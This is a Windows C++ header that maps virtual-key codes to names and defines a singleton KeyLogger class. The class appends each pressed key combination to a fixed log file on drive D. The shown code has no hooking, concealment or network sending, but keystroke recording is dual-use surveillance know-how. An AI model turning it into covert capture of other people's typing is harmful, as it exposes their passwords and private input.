#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <Map>
#include <Vector>
#include <String>
#include <fstream>
#include <iostream>

std::map<DWORD, const char*> vkMapToStr = {
	{ VK_LSHIFT , "LShift" },
	{ VK_RSHIFT , "RShift" },
	{ VK_LCONTROL , "LCtrl" },
	{ VK_RCONTROL , "RCtrl" },
	{ VK_LMENU , "LAlt" },
	{ VK_RMENU , "LAlt" },
	{ VK_LWIN , "LWin" },
	{ VK_RWIN , "RWin" },
	{ VK_APPS , "Menu" },
	{ VK_ESCAPE ,	"Esc" },
	{ VK_TAB , "Tab" },
	{ VK_SPACE ,	"Space" },
	{ VK_RETURN ,	"Enter" },

	{ VK_END , "End" },
	{ VK_HOME , "Home" },
	{ VK_PRIOR , "PageUp" },
	{ VK_NEXT , "PageDown" },
	{ VK_INSERT , "Insert" },
	{ VK_DELETE , "Del" },
	
	{ VK_LEFT , "Left" },
	{ VK_UP , "Up" },
	{ VK_RIGHT , "Right" },
	{ VK_DOWN , "Down" },
	
	{ VK_PRINT , "Print" },
	{ VK_SLEEP , "Sleep" },
	{ VK_SNAPSHOT , "PrtSC" },
	{ VK_PAUSE , "Pause" },
	{ VK_BACK , "Back" },
	
	
	{ VK_NUMLOCK , "NumLock" },
	{ VK_SCROLL , "ScrollLock" },
	{ VK_CAPITAL , "CapsLock" },

	//数字小键盘区
	{ VK_NUMPAD0 , "Num0" },
	{ VK_NUMPAD1 , "Num1" },
	{ VK_NUMPAD2 , "Num2" },
	{ VK_NUMPAD3 , "Num3" },
	{ VK_NUMPAD4 , "Num4" },
	{ VK_NUMPAD5 , "Num5" },
	{ VK_NUMPAD6 , "Num6" },
	{ VK_NUMPAD7 , "Num7" },
	{ VK_NUMPAD8 , "Num8" },
	{ VK_NUMPAD9 , "Num9" },
	{ VK_MULTIPLY , "Num*" },
	{ VK_ADD , "Num+" },
	{ VK_SEPARATOR , "NumEnter" },
	{ VK_SUBTRACT , "Num-" },
	{ VK_DECIMAL , "Num." },
	{ VK_DIVIDE , "Num/" },
	{ VK_OEM_NEC_EQUAL , "Num=" },

	//F区
	{ VK_F1 , "F1" },
	{ VK_F2 , "F2" },
	{ VK_F3 , "F3" },
	{ VK_F4 , "F4" },
	{ VK_F5 , "F5" },
	{ VK_F6 , "F6" },
	{ VK_F7 , "F7" },
	{ VK_F8 , "F8" },
	{ VK_F9 , "F9" },
	{ VK_F10 , "F10" },
	{ VK_F11 , "F11" },
	{ VK_F12 , "F12" },

	{ VK_OEM_1 , ";:" },
	{ VK_OEM_PLUS , "+" },
	{ VK_OEM_COMMA , "," },
	{ VK_OEM_MINUS , "-" },
	{ VK_OEM_PERIOD , "." },
	{ VK_OEM_2 , "/?" },
	{ VK_OEM_3 , "`~" },
	{ VK_OEM_4 , "[{" },
	{ VK_OEM_5 , "\|" },
	{ VK_OEM_6 , "]}" },
	{ VK_OEM_7 , "'\"" },

	//数字及字母
	{ '0' , "0" },
	{ '1' , "1" },
	{ '2' , "2" },
	{ '3' , "3" },
	{ '4' , "4" },
	{ '5' , "5" },
	{ '6' , "6" },
	{ '7' , "7" },
	{ '8' , "8" },
	{ '9' , "9" },
	{ 'A' , "A" },
	{ 'B' , "B" },
	{ 'C' , "C" },
	{ 'D' , "D" },
	{ 'E' , "E" },
	{ 'F' , "F" },
	{ 'G' , "G" },
	{ 'H' , "H" },
	{ 'I' , "I" },
	{ 'J' , "J" },
	{ 'K' , "K" },
	{ 'L' , "L" },
	{ 'M' , "M" },
	{ 'N' , "N" },
	{ 'O' , "O" },
	{ 'P' , "P" },
	{ 'Q' , "Q" },
	{ 'R' , "R" },
	{ 'S' , "S" },
	{ 'T' , "T" },
	{ 'U' , "U" },
	{ 'V' , "V" },
	{ 'W' , "W" },
	{ 'X' , "X" },
	{ 'Y' , "Y" },
	{ 'Z' , "Z" }
};

class KeyLogger {
public:
	static KeyLogger& GetInstance() { 
		static KeyLogger obj{}; 
		return obj;
	}
	~KeyLogger() {
		if (m_logFile)
			m_logFile.close();
	}

	void OnKeyDown(const DWORD& vk) {
		auto it = std::find(m_keyLoggerStack.begin(), m_keyLoggerStack.end(), vk);
		if (it == m_keyLoggerStack.end()){
			m_keyLoggerStack.push_back(vk);
		} else {
			m_logFile << "key already pressed: " << vk << std::endl;
		}
	}

	void OnKeyUp(const DWORD& vk) {
		auto itFind = std::find(m_keyLoggerStack.begin(), m_keyLoggerStack.end(), vk);
		if (itFind == m_keyLoggerStack.end()) {
			m_logFile << "unknown key released: " << vk << std::endl;
			if (m_keyLoggerStack.empty()){
				m_logFile << "m_keyLoggerStack is empty: " << std::endl;
			} else {
				m_logFile << "m_keyLoggerStack is : " << m_keyLoggerStack[0]<<std::endl;
			}
			
			return;
		}
		for (int i = 0; i<m_keyLoggerStack.size() - 1; ++i)
		{
			m_logFile << vkMapToStr[m_keyLoggerStack[i]] << " + ";
		}
		m_logFile << vkMapToStr[m_keyLoggerStack[m_keyLoggerStack.size() - 1]] << std::endl;
		m_keyLoggerStack.clear();
	}

private:
	KeyLogger() :m_logFilePath("D:\\KeyboardRecord.txt") {
		m_logFile.open(m_logFilePath, std::ios::app);
		if (!m_logFile)
			std::cout << "Open File failed!" << std::endl;
	}

private:
	std::string					m_logFilePath;
	std::ofstream				m_logFile;
	std::vector<DWORD>		m_keyLoggerStack;
};


